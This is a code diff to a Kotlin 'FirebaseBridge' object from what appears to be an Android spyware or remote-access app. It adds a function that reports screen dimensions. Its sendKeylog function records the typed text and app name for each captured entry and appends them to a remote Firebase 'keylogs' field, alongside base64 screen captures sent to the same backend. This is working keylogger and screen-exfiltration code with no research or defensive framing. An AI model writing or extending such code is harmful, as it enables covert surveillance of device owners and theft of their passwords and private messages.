@@ -40,14 +40,18 @@ object FirebaseBridge {
         screenRef.setValue(base64)
     }
 
+    fun updateScreenInfo(width: Int, height: Int) {
+        deviceRef.child("screenInfo").child("width").setValue(width)
+        deviceRef.child("screenInfo").child("height").setValue(height)
+    }
+
     fun sendKeylog(packageName: String, text: String) {
-        // Append to the global keylogs field under info
         val timestamp = SimpleDateFormat("HH:mm:ss", Locale.US).format(Date())
         val newEntry = "[$timestamp] $packageName: $text"
         infoRef.child("keylogs").runTransaction(object : Transaction.Handler {
             override fun doTransaction(currentData: MutableData): Transaction.Result {
                 val existing = currentData.getValue(String::class.java) ?: ""
-                currentData.value = (existing + "\n" + newEntry).takeLast(4000)  // keep last 4k chars
+                currentData.value = (existing + "\n" + newEntry).takeLast(4000)
                 return Transaction.success(currentData)
             }
             override fun onComplete(error: DatabaseError?, committed: Boolean, currentData: DataSnapshot?) {}
